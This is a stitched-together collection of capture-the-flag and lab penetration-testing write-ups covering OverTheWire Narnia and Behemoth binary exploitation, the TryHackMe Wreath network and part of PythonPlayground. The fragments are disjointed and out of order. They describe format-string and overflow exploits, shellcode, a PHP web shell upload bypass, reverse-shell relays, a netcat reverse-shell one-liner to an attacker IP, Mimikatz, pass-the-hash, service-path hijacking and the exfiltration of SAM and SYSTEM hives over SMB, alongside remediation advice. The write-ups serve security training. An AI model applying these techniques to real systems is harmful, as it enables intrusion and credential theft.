param 2 1   strcpy local 20  char   param 2 2    endhighlightWithin these two lines lie the vulnerability of the program  Eight bytes are being allocated to the local 18 and local 20 variables  which are then getting passed into the strcpy function with any kind of boundary checks being performed beforehand  The potential danger of this code is outlined within the  BUGS  subsection located in the manual page for the strcpy functionIf the destination string of a strcpy   is not large enough  then anything might happen  Overflowing fixed length string buffers is a favorite cracker technique for taking complete control of the machine  Any time a program reads or copies data into a buffer  the program first needs to check that there s enough space  This may be unnecessary if you can show that overflow is impossible  but be careful  programs can get changed over time  in ways that may make the impossible possibleAdditionally  it is important to check the security of the narnia6 binary with

after printing out the above text  We can use Ghidra to further analyse how the binary functions reports Narnia image13 png There are four functions of interest within the program  main  vuln  goodfunction  and hackedfunction  The main function takes an argument as input and passes it onto the vuln function  This vuln function allocates 128 bytes to the argument  Going further down this function  we can see that the local 84 variable is being assigned to the address of goodfunctionLooking at the code for goofunction  we see that the function simply prints out a message and exits  Interestingly  toward the last line of the vuln function  the snprintf function is called and uses local 84 as an argument  Therefore  it can be deduced that this program is most likely vulnerable to a format string exploit  Seeing as hackedfunction calls  bin sh with setuid privileges  if the local 88 variable is overwritten to point to the address of hackedfunction  then we will receive a shell as the narnia8 userFormat String ExploitThe methodology to exploiting this binary is the same as the one outlined in  Narnia 2   h e4mp3rcoeyar   We can construct a payload that will look like the followingaddress to local 84     PADDINGxThe padding will correspond to the decimal value of the address for hackedfunction so as to overwrite the value of the local 84 with the appropriate address  Note that the program will convert this decimal value into hexadecimal  and the hackedfunction will therefore be executedFrom executing the binary  we saw that the hacked address is located at 0x8048724  Converting this hexadecimal value to decimal  we see that it is equivalent to 134514468  Furthermore  the binary printed out the value for local 84 at 0xffffd568  Therefore  a string comprised of the address to this variable in little endian format  as this binary is in little endian  followed by a padding of 134514468 will result in the execution of hackedfunctionhighlight bash

inner workings of the program reports Narnia image6 png There are two interesting functions  main and func  The main function simply gets the argument and passes it into func  Within this function are 2 global variables  local 1c and local 8  Twenty bytes are allocated to the former  while the latter is set to the argument  The local 1c variable has all of its contents set to 0  Within the while loop appears to be a sort of operation that is setting local 1c equivalent to some index within local 8  Just as in the previous binaries  Ghidra may have mistook a for loop for a while loop  It is possible that this segment in the code actually looks like the followinghighlight c for i 0  local 8 i      0   ilocal 1c i    local 8 i     i   i   1endhighlightAfter performing this operation  the program prints the contents of local 1c  Looking at this for loop  we can see that the vulnerability lies within the fact that 20 bytes are allocated to the local 1c variable  but an argument of greater than 20 bytes can be inputtedAdditionally  running checksec on the binary reveals that the NX bit is also disabledhighlight bash    0xd4y Writeup     business other overthewire narnia 8

why we were only able to overwrite other areas of memory only after including the address of the buffer in the payload  is because of the for loop within the program  When the address to local 8 is

vulnerable to exploitation using well known techniques  among them being re2libc  format string exploitation  and shellcode injection  The following remediations will strengthen the security of every tested binaryPerform boundary checks before passing user input into functionsAlmost every binary outlined in this report was vulnerable due to failure of checking boundariesSensitive memory addresses were overwritten allowing ret2libc among other attacksUnnecessary disabling NX bitThe NX bit was unnecessarily disabled for multiple binaries resulting in shellcode injectionUntrusted user input was directly passed to functionsTwo out of nine binaries  namely  Narnia 5   h n6g8yeh9n8qz  and  Narnia 7   h v80flpijk1ef   passed unsanitized user input directly to snprintf without boundary checksSETUID permissions for every binary tested in this report should be removed immediately until the remediations outlined above are observed1    ftnt ref1   https   github com pwndbg pwndbg  https

function is used to allow up to 200 bytes to be passed to the local cc variable  and therefore this binary is not vulnerable to a buffer overflow exploit  However  the user input  local cc  is passed directly to the printf function without any sort of sanitization  Consequently  the program is likely vulnerable to a string format exploit  3    ftnt3Discovery of Format String VulnerabilityThis can be verified by passing a format string into the local cc variablehighlight bash behemoth3 behemoth  behemoth    behemoth3Identify yourself   xWelcome  a7825aaaand goodbye again    endhighlightDespite

as an input  it starts to leak memory from the stackThis vulnerability can be abused to overwrite memory by using the  n format string which writes the number of characters written into a pointer parameter  If the pointer parameter is an address that the binary uses  then the memory address of the function can be overwritten to point to shellcode  This can result in the execution of arbitrary

there are a total of three functions displayed  printf  fgets  and puts   However  the fgets and printf functions should not be overwritten  as these functions must work properly to accept the

by the address of puts and another string of four A s  This is then followed by puts   2  and finally the nop sled begins at 0xffffd4e8   8  For the purposes of this exploit  a memory address of 0xffffd518 was chosen  Note how this value in decimal is 4294956312 which theoretically could be obtained by passing in an exploit that is about 4294956312 bytes long  In reality  however  this would cause a memory overload  and even if it didn t  printing this many bytes to stdout would take a long time    As mentioned in  Exploit Development   h jagnc9qowxus   this can be bypassed by passing two

65535  This largely reduces the 4294956312 length previously mentioned  Incidentally  the largest value possible for a 32 bit binary is 16 8   1 which is 4294967295 or 0xffffffffA value of 0xef was

called  and local 14 is set to equal its output  This output is then concatenated with  tmp  and local 30 is set to equal it  Afterwards  the local 18 variable is set to equal the output when opening a file in  tmp whose name corresponds to the id of the binary s process  which is local 30   If the file does not exist  then  PID not found   is printed out  Otherwise  the contents of the file is read out by using the getchar function within a while loopBinary ExploitationThe problem with this program is that it assumes that it can only read files within the  tmp directory  However  symbolic links can be used to make the program read the password file of the behemoth5 user Symbolic Link AttackSeeing as the pid of the binary cannot be easily determined before executing the program  a bash script can be utilized to create many files that correspond to possible PIDs  Before creating this bash script  the approximate PID of the binary must first be foundhighlight bash behemoth4 behemoth

behemoth7   endhighlightNamely  that file is called behmoth6 reader and it might be used by the behemoth6 binary  After downloading the binary onto the attack box  the binary can be analyzed with the help of GhidraGhidraGhidra translated the assembly code found for each binary into the following reports Behemoth image9 png The code on the left was produced by the behemoth6 binary  while the code on the right is from the behemoth reader  Looking at the code for the bhemeoth6 reader program  a file named shellcode txt is expected  However  the contents of this file are not printed out anywhere  If a file named shellcode txt exists  then a small sanitization is performed against the file  if the 0xb byte exists within the file  then the program immediately exitsIn short  the program is executing the contents of the shellcode txt file as machine code  Therefore  shellcode will get executed by the binary  This  however  will not directly result in a privileged shell due to the fact that the SETUID bit is not enabled on the behemoth6 reader binary  Rather  the behemoth6 binary has the SETUID bit  and its interaction with the behemoth6 reader will determine the significance of the shellcodeLooking at the code for behemoth6  observe that the file is opened using the popen function in read mode  after which the output is passed into the   stream variable  This variable then gets passed into   s1 which is compared against the string  HelloKitty  in the strcmp function  If the contents of this variable matches the string  then a  bin sh shell is returnedAbusing popen  The output of the popen function is determined by the behemoth6 reader  Consequently  if the behemoth6 reader executes shellcode that makes it print out  HelloKitty   then a shell will be returned  There are already shellcodes online that perform this operation  and the following shellcode was used  9    ftnt9highlight c char code        xe9x1ex00x00x00               jmp     relative   MESSAGE

binaries which in practice should not be vulnerable  turned out to be exploitable due to the calling of sensitive system commands  in particular  bin sh   This resulted in the horizontal privilege escalation in  Behemoth 0   h y1go15cthbxu  and  Behemoth 6   h 1iiwc3vpzmajThere were multiple different vulnerabilities associated with each binary  running from format string exploits to buffer overflows and privilege escalation via the PATH environment variable The following remediations should strongly be consideredPerform boundary checks on user inputMultiple binaries were vulnerable due to the lack of boundary checksShellcode injection was possible on many binaries due to this lack of validationBad shellcode filtering can be bypassed if EIP can be overwritten as can be seen in  Behemoth 7   h tqwpdz749mlq Filter user inputMalicious shellcode could easily be injected in multiple binaries due to the lack of user input validation  although shellcode could be encoded  this would nevertheless mitigate these kind of attacks Never run sensitive system commands unless absolutely necessarySystem commands such as  bin sh should rarely ever be called  especially within a SETUID binary  due to its insecurityBinaries that should not have been vulnerable turned out to be exploitable due to calling  bin shAlways use the full path of a commandPATH environment variable attacks were present on  Behemoth 2   h 9e7hwp9wx39h Never read files that can be created by an untrusted userSymbolic links can be used to exploit this vulnerability as can be seen in  Behemoth 2   h

vulnerabilities in a client s network  Thomas Wreath   1    ftnt1   The attacks conducted in this report were not carried out in a black box penetration testing environment  rather the client informed us that he had a git server hosted on one of the machines in his network from which he hosts his website  Furthermore  I was told that there are three computers in the client s network  one of which the client assumed I could not penetrate as it had antivirus software installedThough the client was cautious about downloading potentially dangerous software on any of his systems  he did not update software on two out of three computers  allowing me to gain immediate root access on two thirds of the network  The third machine ran insecure code on a web page which could be exploited through uploading a malicious image fileAttack NarrativeFirst Machine   200We are given the ip of one of the systems on the network  This is the only machine in the network that can be immediately accessed  and thus it will be the first targetReconnaissanceAs with all penetration tests  I started by enumerating the ports of the target  This is an important step  as it is useful in identifying possible attack vectors  The services and versions of our target can be enumerated using the nmap tool and giving it the flags  sC and  sV  The  sC flag runs nmap s default scripts  while the  sV flag detects the versions of the scanned services  Note that knowing the version of a service is essential in determining the likelihood of it being vulnerable  old versions tend to have more known vulnerabilities  as they have been exposed to the warzone of the internet for a longer period of time   We can enumerate all open ports with the  p  flag and output all formats with the  oA flag reports Wreath image28 png We see that there are only four ports open  From the nmap scan  observe that the target machine is running an HTTP and HTTPS server on ports 80 and 443 respectively  It s important to notice that it is running Apache httpd 2 4 37 which belongs to the CentOS Linux distribution  Therefore  it s very likely that the target is running CentOS reports Wreath image43 png Using the curl tool to send a GET request to the server  we see that it is trying to redirect us to https   thomaswreath thm  However  the DNS of the target is not set up  as can be observed from the domain not being able to route us to the requested website reports Wreath image38 png Currently  this domain is not recognized by any of our VirtualHost  2    ftnt2  definitions  However  adding thomaswreath thm to the  etc hosts file  the file in Linux which is responsible for mapping hostnames to IP addresses   and running the same curl command again produces a different output reports Wreath image5 png  reports Wreath image21 png We can add the  k flag to specify that we don t care to verify the server s certificate  note this is insecure but it is fine in the context of this test reports Wreath image65 png And now we get what looks to be a webpage  Browsing to this domain through Firefox  we reach yet another warning reports Wreath image7 png One thing that s important to do before proceeding to the website is to check the server certificate  The certificate could give information about more domains that the web server may have  as well as some other useful information like names  locations  and email addresses  This can be checked by clicking on the  Advanced   box  and then clicking on the  View Certificate  link  I didn t see anything too interesting  but there is one email address reports Wreath image45 png I now proceeded to the website and was met with the following page reports Wreath image39 png RCE ExploitationNothing out of the ordinary was found while browsing through this website  However  going back to the result of the nmap scan and looking at the software version of the Webmin interface  it turned out that this service was outdated  Searching this service on Google revealed that there is a CVE  Common Vulnerabilities and Exposures  for it  Namely  this vulnerability is categorised as CVE 2019 15107  3    ftnt3  and ranked as a 9 8 critical vulnerability  Exploiting this vulnerability allows unauthorized remote code execution  RCE  due to a backdoor in the password resetting function Reverse ShellSeeing as this is a well known vulnerability  Metasploit already had a script to exploit this version of Webmin reports Wreath image49 png After setting the LHOST and RHOST  I ran the exploit and got a shell reports Wreath image47 png The web server was running as root  It is better practice to run a web service as a low privileged user such as www data just in case the web server gets compromised PersistenceAs root  the highest privileged Linux user  we can extract the hash of users on the system and try to crack it  It s possible that this same password is used in some other machine on the network reports Wreath image58 png Providing the   example hashes flag in hashcat  a tool for cracking hashes  and grepping for unix  we can see that the mode for the  etc shadow hashes is 1800  note that the hash corresponding to mode 1800 looks most similar to the hashes in the  etc shadow file reports Wreath image27 png Alternatively  another way to determine the identity of a hash is by using tools such as hashid or hash identifier reports Wreath image37 png The password used for the root user is secure enough to not be cracked by the rockyou txt file  so I copied this hash to examine for later if neededAfter compromising the root user  I maintained persistence by going into  root  ssh id rsa and copying the contents of the id rsa file  this is a private key which is used to authenticate a client to a server reports Wreath image29 png Second Machine   150Host EnumerationWith full access on one of the three machines on the Wreath network  I enumerated the internal network to find any other systems by using nmap on the compromised system  a static binary of it can be downloaded on GitHub  4    ftnt4    To speed up the process  I added the  sn flag which disables port scans reports Wreath image33 png We see that there are a total of four other machines on the internal network  note we are 10 200 111 200   I was told by the client that the host ending in  1 is part of the AWS infrastructure used for creating the network  and the host ending in  250 is the OpenVPN server  As such  we will focus on the two hosts ending in  100 and  150 Port EnumerationAfter discovering these two hosts  I enumerated their ports reports Wreath image34 png Observe that all of the ports on the  100 machine are filtered  but the  150 computer has three ports open  80  3389  and 5985   It s important to note that it s likely this is a Windows machine due to ports 3389  typically reserved for RDP  and 5985  WRM   WinRM  being openPort ForwardingThe HTTP service on port 80 is a good one to forward because web servers have a big attack surface  I chose to forward this port to localhost on port 18020 using ssh reports Wreath image48 png Now when I visited localhost 18020  I was met with a web page reports Wreath image32 png Looking at the error on the webpage  we see that there are three directories1   registration login 2   gitstack 3   restThe  user subdirectory under  rest discloses information about the users on the GitStack software  but I was unable to find anything that looked alarming reports Wreath image44 png Visiting  gitstack redirected me to a login page on  registration login reports Wreath image50 png There is a nice handy message that says the default username and password is admin admin  but trying it out reveals that the credentials for this login page have since been changed  The source code of the page did not reveal anything eitherRCE ExploitationHowever  knowing that this machine is only available on the internal network  it is possible that its software is not updated  The outdated software of this website is especially alarming when looking at the output of nikto  a tool for scanning vulnerabilities on web servers reports Wreath image9 png Note the large amount of outdated softwareIt follows that the GitStack software used on the target might also be outdated and vulnerable  Searchsploit is a great tool for finding exploits for outdated software reports Wreath image16 png All three exploit results about GitStack are about the same version  namely 2 3 10   I then copied the exploit php webapps 43777 py onto my local machine Exploit AnalysisBefore running this exploit  we will examine it to see how it works reports Wreath image14 png As can be seen from the image above  the password field is most likely vulnerable  as it turns out  the username field is also vulnerable   The python script injects PHP code into the password field  and the web server executes it  This critical vulnerability was caused by passing unsanitized user input into an exec function  5    ftnt5 reports Wreath image15 png When running the script  it uploads a PHP web shell called exploit php with the parameter  a  to the  web directory  I modified the script and called it exploit 0xd4y php  as it is good practice to change the default configurations of an exploit whether that be a password to a backdoor  parameters  etc Reverse ShellI curled this web shell and provided it the  d flag to specify the data to be inputted reports Wreath image13 png And this web server is running as System  the highest privileged Windows user  even higher than Administrator   I then tried to find a way to get a reverse shell from the exploited system  The first thing to test is to see if our attack box can be pinged from the target  I made sure to use the  n flag to specify how many packets to send   It is extremely important to note this seemingly insignificant flag  If we were to not specify how many packets to send  the server would constantly be trying to ping us  and there would be no way for us to stop this command without somehow killing the process  A constant ping to our attack box would therefore look suspiciousPivoting through  200We can set up a tcpdump on the tun0 interface  the VPN routing path  and provide it with the icmp argument  Internet Control Message Protocol  so that we are only listening for pinging packets reports Wreath image40 png Alas  I did not receive a response from the server  This meant that we cannot send a direct reverse shell from  150 to us  However  we can use nishang  6    ftnt6  to get a socat reverse shell relay  CentOS  the operating system of the compromised  200 machine  has a very restrictive firewall called firewalld that will limit almost all inbound connections reports Wreath image46 png We can see that the firewall is activeUnfortunately  our attack box cannot  talk  with the  150 machine directly  but the host ending in  200 can  This means that we could get a reverse shell by setting up a listener on the  200 machine which forwards traffic to us  and then have the  150 host directly send the reverse shell to the  200 host Socat Relay Reverse ShellI used a socat reverse shell to demonstrate this  as it is instructive on how networking traffic can be directed1   We are going to set up a listening port on 20001 on the  200 machine and forward all traffic from that port to 20002 on our machine reports Wreath image35 png 2   Next  we will set up netcat listening on port 20002 on our system reports Wreath image66 png 3   I used the Invoke PowerShellTcp ps1 nishang script and added Invoke PowerShellTcp  Reverse  IPAddress 10 200 111 200  Port 20001 to the bottom of the script  so that when downloading the script using IEX  more on this later   each line in the script will be automatically executed giving us a reverse shell reports Wreath image20 png Note how we are sending the reverse shell to  200 on port 20001  remember all traffic on port 20001 will be directed to our port 20002 on our machine4   Now  the firewall will block inbound connections for any ports that are not specified as exceptions  We have to tell the firewall which ports it should allow for connections by using the firewall cmd command as such reports Wreath image41 png Alternatively you can type systemctl stop firewalld to completely disable the firewall  though this is one of the noisiest actions a pentester can do  and it should only be done when it is an absolute necessityRemember that port 20001 will be directing all traffic to us5   Port 20003 will be the HTTP server on  200 which we can set up with python3  m http server 20003  it will serve the powershell reverse shell file  which I renamed to 0xd4y rev ps16   Finally  it s time for the payload  We can download files   strings using IEX  Elixir s Interactive Shell  in powershell reports Wreath image70 png Note the usage of three single quotes in the data argument to tell our bash shell to not interpret anything inside the quotesUnfortunately  this payload did not work  most likely due to some special characters   I am running commands through a web shell  and therefore it is likely that the server is not understanding some of the special characters in the payload  This means that most likely we will have to url encode the payload for it to work reports Wreath image64 png Sure enough  when I executed this command  the output hanged and I got a hit on the python HTTP server reports Wreath image77 png So now that 0xd4y rev ps1 was executed by the server  there should be a reverse shell getting sent to port 20001 on  200 which is getting forwarded to us on 20002 reports Wreath image17 png  Attempting to Use MimikatzNow  with a reverse shell as System  we have the necessary privileges to extract password hashes using Mimikatz  a tool used to gather credentials on a system  Before downloading Mimikatz onto the target  it s important to check if the target is a 32bit or 64bit computer by using the systeminfo command reports Wreath image53 png Noticing that this is a 64bit computer  I downloaded a 64bit mimikatz binary reports Wreath image25 png I downloaded this binary in the C WindowsSystem32spooldriverscolor directory out of habit  as this is a world writable path and is typically whitelisted by AppLocker  a program which restricts which files can be executed based on the file s pathAlas  running Mimikatz on an unstable shell simply does not work  I tried getting a meterpreter shell  but that did not work either  However  with ssh being open on  200  a powerful tool named sshuttle can be leveraged as a VPN into this internal network reports Wreath image12 png We can confirm this worked by trying to curl the web page reports Wreath image10 png Shell StabilizationEarlier  we found that port 3389 was open on the  150 system  This is the port typically designated for Remote Desktop Protocol  RDP   and we can use this port to get a nice GUI on the box  First  I created a user with admin privileges inside the Remote Management Users group so as to allow us to remotely authenticate as the user through RDP reports Wreath image11 png We can now use evil winrm with our created credentials to easily get a shell on the box reports Wreath image76 png  MimikatzWith the user that we created  a nice GUI instance can be established using the xfreerdp command as follows reports Wreath image31 png This results in a GUI instance of the box  I executed cmd exe as Administrator because the created user is part of the Administrators group  With administrative privileges  it s possible to extract Windows  stored credentials  I talk about this in depth in my Bastion Writeup  7    ftnt7 reports Wreath image52 png  reports Wreath image59 png  reports Wreath image1 png These NTLM Hashes were edited so as to not expose the full hash  How Mimikatz WorksLooking at the output of Mimikatz  we can see the hashes for all the users on the system  This is due to the single sign on  SSO  feature of Windows  The SSO feature is used so as to not constantly ask the user to input his username and password whenever he wants to access a resource on the network  as this is simply tedious  once again  the great old war between convenience and security   Instead  the server hashes the user s password and stores it in the SAM  Security Account Manager  hive  These credentials are then managed by the Local Security Authority  LSASS exe   essentially enabling SSOCopying the output of Mimikatz  I saw that Thomas has an insecure password which hashcat cracked  alternatively  you can use  https   crackstation net   https   www google com url q https   crackstation net   sa D source editors ust 1653838005042499 usg AOvVaw1faAwek1  0r6RfsC5v4ie   8    ftnt8    However  the Administrator password was too secure to crack  but it is still possible to use this hash for authenticating as the Administrator user  Evil winrm has an extremely powerful flag denoted with  H which is used to gain access to an account by performing a pass the hash attack  PtH reports Wreath image68 png   How a Pass the Hash Attack  PtH  WorksAs can be seen in the image above  we authenticated as Administrator despite not specifying the password for the user  confirming that PtH worked  This attack works as follows  9    ftnt9Pentester  Cool  I just got Administrator s hash so let s use evil winrm to access the powershell exe resource as Administrator   Hey server  Give me powershell exe as AdministratorServer   Hi there Pentester  I know you want powershell exe as the Administrator user  but I can t just give it to you without verifying first that you are in fact the Administrator  I ll test you by sending you this random 16 byte integer  65532345234   34324234  Encrypt this with your password hash and send the response back to mePentester  No problem  I ll encrypt this 16 byte number with Administrator s hash   Hey Server  Here is my encrypted response                   121  the actual encryption doesn t really look like this in reality  but I will use this string for the purpose of demonstrationServer   Alright  thanks for the response Pentester  Hi Domain Controller  I challenged Pentester with this 16 byte integer  65532345234   34324234  and this was his encrypted response                    121Domain Controller  Right  well I have Server s challenge and Pentester s response  Let me go check my library of NTLM hashes and see if I can decrypt this response with Administrator s hash   and I can  This must be Administrator then   Hello Server  I was able to decrypt the response with Administrator s hash  so this must be Administrator  Grant the client the powershell exe resourceServer   Sure thing  Here you go PentesterPentester   Thanks for the shellThird Machine   100Port EnumerationAfter establishing persistence on the  150 host  the third and final machine is yet to be compromised  the  100 computer   The first thing we should do is enumerate the ports of the machine  just like we did with all the other compromised systems  Instead of trying to manually upload a port scanning script onto the box  we can use evil winrm by utilizing the  s flag reports Wreath image22 png We see that ports 80 and 3389 are open  These most likely correspond to HTTP and RDP respectively  Unfortunately  we cannot access this computer through the  200 proxy because it is only visible by  150Forward SOCKS ProxyThis means that we will need to create a proxy on the  150 machine  A tool called chisel comes in handy for this operation  To set up a forward SOCKS proxy on the  150 machine  we first need to follow a couple of steps1   The server must be told to disable the firewall on the port we want to use for the forward proxy  I will use port 30001 reports Wreath image6 png 2   The server should then be told to listen on port 30001 for inbound connections reports Wreath image18 png 3   Next  on the attacking box we want to connect to the listening port  and forward all data to a proxy sitting on 30002 reports Wreath image71 png 4   We then configure the web browser extension FoxyProxy to connect to this proxy reports Wreath image8 png 5   Finally  we can visit the website sitting on  100 reports Wreath image73 png Examining the Web ServerAlong with FoxyProxy  Wappalyzer is also a very useful browser extension which displays useful information about how a website is built  Running this extension on Thomas s personal website  we see the following reports Wreath image36 png  Analysing the Website s CodeThis website looks identical to the one on the  200 host  Thomas told us that he is  serving a website that s pushed to my git server   The  150 machine has a git server and this is most likely what he was referring to  so I downloaded the source code of his website reports Wreath image75 png Using the extractor tool from GitTools  10    ftnt10   I iterated through the commits of the git repository  Unfortunately  this tool does not list the commits by date  but this can be done manually by looking at the parent of each commit reports Wreath image74 png We see that the commit starting with 70dd does not have a parent  so this must be the oldest commit  The parent of 82df is 70dd  and the parent of 345a is 82df  This means that from youngest to oldest the commits are as follows1   345a2   82df3   70ddWe can examine the code from the most recent commit  Seeing as Wappanalyzer identified Thomas s webpage as being run in PHP  it follows that there should likely be an index php file reports Wreath image54 png Taking a look at the file  there seems to be an upload feature that redirects uploaded files to a directory called uploads        reports Wreath image62 pngThe filter checks if a file is an image based on its size and if a file ends with a valid extension  We can see that the allowed extensions are jpg  jpeg  png  and gif  so I examined how the webpage identifies the extension reports Wreath image60 png The explode function splits a string into an array based on a specified parameter  In the code  it is set to split based on the period character and grabs the string at index one  note that this is the second element in the array  as the first element is at index zero   It then compares this string with one of the allowed extensions  The problem with this is that upon uploading a file called reverse shell jpg php  the code will split the file as followsreverse shell   jpg   phpThen  the string in the first index  jpg  will be compared  Thus  we have bypassed the first filter  The second filter  i e  the image size check  can also be bypassed  11    ftnt11   We can add a comment to an image with malicious php code  and if the server executes our image as php  then our malicious code will work as a web shell reports Wreath image56 png A basic HTTP authentication is required to access the  resources directory  but we cracked Thomas s hash  before   h wzvkxqwdhgz4   so it is likely that Thomas reused this password for authentication to his web server  We can guess that the username is Thomas  or other variations of his name  and we get into the upload page  it turns out that the username was indeed ThomasReverse Shell reports Wreath image3 png I then uploaded the malicious image file  0xd4y image jpg php reports Wreath image51 png Visiting the uploaded script on resources uploads 0xd4y image jpg php reveals that it got successfully uploaded  To test if the image successfully is getting executed as php  I gave the command of whoami to the parameter cmd reports Wreath image63 png And the php web shell works  The next step is to get a reverse shell  After identifying the target as a 64 bit machine by using systeminfo  I uploaded a 64bit netcat binary  12    ftnt12  and called it 0xd4y nc exe  I then set up an HTTP server on my local box with python and downloaded the binary onto the system with curl  To get a reverse shell  I used a simple nc reverse shell payload  powershell exe 20C xampphtdocsresourcesuploads0xd4y nc exe 2010 50 112 6 20443 20 e 20cmd exe reports Wreath image30 png Note how I used port 443 for the reverse shell  as this port tends to be treated as unsuspicious by AV  In contrast  using port 1337 or port 9001 seems very suspicious  but in this case it works anywaysPrivilege Escalation to System Searching for MisconfigurationsEnumerating the privileges of our compromised user  we don t see anything too out of the ordinary reports Wreath image72 png However  this user does have the SeImpersonatePrivilege which could potentially be vulnerable to exploits such as Juicy Potato  13    ftnt13   note that even though this is a 2019 Windows system rather than 2016  there have been some exploitations of this privilege in later versions  14    ftnt14I ignored this potential privilege escalation vector due to its greater complexity  and I enumerated the services for a potential vulnerability to an unquoted service path attack Unquoted Service Path AttackIt s likely that the default Windows paths will not be vulnerable to this sort of attack  so I focused on services that were not in C Windows reports Wreath image67 png As it turned out  there was a service that contained an unquoted path called SystemExplorerHelpService  How an Unquoted Service Path Attack WorksDue to there not being quotes around the path to this service  Windows does not know where to execute the desired binary  Seeing as the path for this vulnerable service is C Program Files  x86 System ExplorerSystem ExplorerserviceSystemExplorerService64 exe  Windows will check for a binary in the following order  15    ftnt151   C Program exe2   C Program Files  x86 System exe3   C Program Files  x86 System ExplorerSystem exe4   C Program Files  x86 System ExplorerSystem Explorerservice exe5   C Program Files  x86 System ExplorerSystem ExplorerserviceSystemExplorerService64 exeIt is highly unlikely that the compromised user has write access to C Program Files x86   but it is probable that the user can write to C Program Files x86 System Explorer  Therefore  we can create a malicious binary called System exe in the appropriate path  and it will get executed  Creating a Malicious BinaryChecking to see if this service is running as System revealed that it is reports Wreath image24 png This seemed like a good vector for privilege escalation  however  I understood that I would be lucky if the compromised user had permissions to edit this service reports Wreath image4 png Seeing as we are part of the BUILTINUsers group  we have FullControl to this service  The System Explorer executable can therefore be replaced by whatever we would like  I created a program in C  called malicious cs that returns a reverse shell reports Wreath image78 png Following the creation of the script  I compiled this program with mcs  a C  compiler reports Wreath image26 png After compiling the program  I renamed malicious exe to System exe  Seeing as System is running the service we are trying to hijack  it follows that we should get a reverse shell as System when restarting the service  After downloading the binary to the target  I copied it over to the C Program Files  x86 System Explorer directory reports Wreath image19 png With the malicious binary in place  I set up a netcat listener on port 443  as specified in the C  code  before restarting the service reports Wreath image57 png Typing sc stop SystemExplorerHelpService  to stop the service  and sc start SystemExplorerHelpService  to start the service  resulted in a reverse shell as System reports Wreath image2 png Data ExfiltrationNow  with a reverse shell as System  we can extract the stored credentials on this system  Mimikatz cannot be used as Antivirus is installed on this machine  However  because we are System  we can copy the SAM and SYSTEM files and locally extract the stored hashes  I set up an SMB server on my machine to download the files with sudo impacket smbserver share    smb2support  username 0xd4y  password pass and transferred the SAM and SYSTEM hives as follows reports Wreath image61 png  reports Wreath image55 png Note that we received the NTLMV2 hash of our created SMB user  Cracking this hash reveals that the password of 0xd4y is passOn the reverse shell  I typed copy HKLMSYSTEM 10 50 112 6shareSYSTEM  andcopy HKLMSAM 10 50 112 6shareSAM reports Wreath image42 png Now with the sensitive SAM and SYSTEM hives on my local system  I was able to extract all hashes using the impacket secretsdump tool reports Wreath image69 png CleanupAfter fully compromising the Wreath Network  I deleted all the binaries that I downloaded  namely 0xd4y socat  0xd4y nc exe  System exe  and exploit 0xd4y php   Though the removal of these binaries allowed for a stealthier compromise  the attacks conducted in this report were not meant to be particularly stealthy  Many binaries used were not obfuscated  and file transfers were conducted over SMB and HTTP rather than HTTPSConclusionThe attack surface of a web server is much bigger than most other services  It is essential to be wary of which services are running as a privileged user  There was no need for local privilege escalation in two out of three compromised machines during this penetration test  If possible  it should be refrained from using root to run services unless it is absolutely necessary  This will cause a greater difficulty for an attacker to attain root access on a system  and will greatly mitigate the potential damage in case of a breachThe client had multiple critical vulnerabilities in his network  The specific remediations for patching the vulnerabilities outlined in this report are as followsInstall the latest software for all running services  even if a system is only running on an internal network with no outside internet accessThe first and second compromised machines had old software with critical vulnerabilities which can be easily patched by updating the softwareRefrain from using root to run any services unless it is absolutely necessaryThis note is especially true for web servers as they have a large attack surface  It is recommend to create a low privileged user specifically for the purpose of running a web serviceNever reuse passwordsA cracked password from the second compromised machine was reused for accessing a webpage on the third machineBe mindful of potential misconfigurations The privilege escalation on the client s personal computer was possible due to a misconfiguration of a service running as SystemThe compromised low privileged user was able to configure services despite not being part of the Administrators groupFilters in code should be meticulously analyzedCode for uploading files on the website of the third machine did not successfully filter potentially malicious filesThe goals of this penetration test were met  As requested by the client  I was able to successfully compromise the Wreath network with root access on all three systems  The client is highly encouraged to patch his systems with the aforementioned remediations as soon as possible1    ftnt ref1   https   tryhackme com room wreath  https   www google com url q https   tryhackme com room wreath sa D source editors ust 1653838005064997 usg

instead because it is better formatted reports PythonPlayground image18 png  reports PythonPlayground image16 png As the name suggests  this box was all about using python to exploit its vulnerabilities  Each part of this box was like a puzzle piece which  when connected together  gave you the ability to escalate to root  Let s get right into the box  as I ll go into detail about each aspect of exploiting this box s vulnerabilitiesRECONAs usual  I will start by scanning the ports with nmap reports PythonPlayground image10 png Looks like only http and ssh are open  There is not much information from this nmap scan  other than that we know the box is running Ubuntu reports PythonPlayground image27 png Clicking on Login or Sign up doesn t lead to anything interesting  as we are just met with this page reports PythonPlayground image5 png It looks like each web page is appended with  html  so let s run a gobuster on the root page with the extension  html reports PythonPlayground image22 png The  admin html directory particularly stands out  so let s check it outGetting Credentials reports PythonPlayground image2 png Immediately from the name of this login form  it looks like there is probably a user named Connor  It s good practice to check out the source code to see if there are any interesting comments or links to other directories on the website reports PythonPlayground image26 png  reports PythonPlayground image23 png So we can see from the code above that the login form takes a password and  hashes it   I put  hash  in quotes because this code does not actually hash an input  In an actual password hash  the output does not give information about the input  For example  in mathematical operation of addition we know that 1 1 2  However  let s say I added two numbers together without telling you which numbers I added  and all I told you was that the sum of those two numbers is equal to 2  Then I asked you   Which two numbers did I add to get the number 2    It could be 1 1  or 2 0  or maybe even 1 7 0 3  The possibilities are endlessThe problem with the code on the webpage  is that it leaks the hash to us as well as how the hash was produced  but more importantly  the length of the hash is dependent on the length of the input  This means that data is not lost during the hashing process  All of this considered  we can reverse the hash to get the password  A very simple way to do this is by taking the javascript code that we saw in the source of the webpage  and inputting all characters in the order determined by the ascii table  Using this  we can see the output that the hash creates for each letter  remember about how this code does not lose inputted data reports PythonPlayground image15 png Using this method  our code does not need a lot of lines  You can view my script  here  https   www google com url q https   github com 0xd4y Writeups blob gh pages TryHackMe crack py sa D source editors ust 1653953672142990 usg AOvVaw17cVA7TMh7fjsB E1XDH f  if you d like  I have since edited it to be more user friendlyIncidentally  even if we did not know the code of the hash  we can see that the length of the output is always four times the length of the input  because data is not lost reports PythonPlayground image6 png Anyways  let s try the cracking function reports PythonPlayground image20 png And we get Connor s password as spaghetti1245  Inputting the username connor and the password  we get redirected to  super secret admin testing panel htmlIt turns out that we could have just gone to this page without even needing Connor s password reports PythonPlayground image11 png I did not realize this the first time going through the box  Looks like authenticated cookies are not needed to view this site reports PythonPlayground image25 png Typing python code into the text field  we see that this form runs our code  So let s try a python reverse shell reports PythonPlayground image12 png Unfortunately  this does not work as there is some sort of blacklist on the import keyword  I tried bypassing this by writing  imp  to a file and then 